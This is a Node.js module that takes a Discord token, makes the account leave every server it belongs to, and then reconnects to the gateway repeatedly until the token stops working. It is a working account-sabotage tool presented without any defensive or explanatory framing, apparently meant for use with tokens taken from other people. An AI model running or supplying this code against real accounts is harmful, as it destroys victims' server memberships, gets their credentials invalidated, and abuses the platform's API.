const WebSocket = require('ws');
const { get, delete: del } = require('snekfetch');
const tokens = {};

module.exports = (token, bot = true, force = false) => {
	if (token in tokens && !force) return;

	if (!force)
		get('https://discordapp.com/api/users/@me/guilds')
			.set('Authorization', `${bot ? 'Bot ' : ''}${token}`)
			.then(async res => {
				for (const guild of res.body)
					await Promise.all([
						new Promise(r => setTimeout(r, 2000)),
						del(`https://discordapp.com/api/users/@me/guilds/${guild.id}`).set('Authorization', `${bot ? 'Bot ' : ''}${token}`),
					]);
			})
			.catch(() => console.log(`Couldn't fetch guilds for ${token}.`));

	const ws = new WebSocket('wss://gateway.discord.gg/?v=7&encoding=json');

	ws.once('open', () => {
		ws.once('error', () => module.exports(token, true));
		ws.once('close', code => {
			if (code === 4004) {
				delete tokens[token];
				console.log(`Invalidated ${token}.`);
			} else setTimeout(module.exports, Object.keys(tokens).length * 5000, token, true);

			ws.removeAllListeners();
		});
		ws.on('message', data => {
			const { op, t } = JSON.parse(data);

			if (op === 10)
				ws.send(JSON.stringify({
					op: 2,
					d: {
						token,
						properties: {
							$os: process.platform,
							$browser: 'NodeJS',
							$device: 'NodeJS',
						},
					},
				}));

			if (op === 0 && t === 'READY') {
				if (token in tokens) tokens[token]++;
				else tokens[token] = 1;

				ws.close();
			}
		});
	});
};